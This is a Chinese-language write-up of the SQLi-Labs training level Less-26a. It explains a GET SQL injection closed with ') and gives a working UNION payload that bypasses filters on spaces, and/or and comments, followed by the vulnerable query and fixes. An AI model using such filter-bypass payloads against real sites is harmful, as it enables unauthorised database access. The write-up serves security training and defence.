# SQLi-Labs | Less-26a GET 单引号括号 ') 过滤空格 and or 注释
## 一、漏洞简介
GET注入，闭合符号 `')`，过滤空格、and、or、注释符，括号代替空格，双写绕过关键字。
## 二、环境信息
靶场地址：http://127.0.0.1/sqli-labs/
关卡路径：/Less-26a/?id=1
注入类型：GET、字符型、')闭合、多黑名单过滤
## 三、复现步骤
1. ?id=1') 报错，确认闭合。
2. 空格、and/or、注释全部过滤，括号代替空格，双写绕过and/or。
3. 构造union语句，末尾 `and'1'='1` 闭合。
## 四、Payload
`?id=-1')union(select(1),version(),database())and('1')=('1`
## 五、漏洞原理
`SELECT * FROM users WHERE id=('$id') LIMIT 0,1`
简单黑名单过滤，绕过方式多。
## 六、修复方案
1. 预编译查询，放弃黑名单防护。
2. 输入白名单校验。
## 七、总结
Less26a是26的升级版，闭合带上括号，对语法匹配要求更高。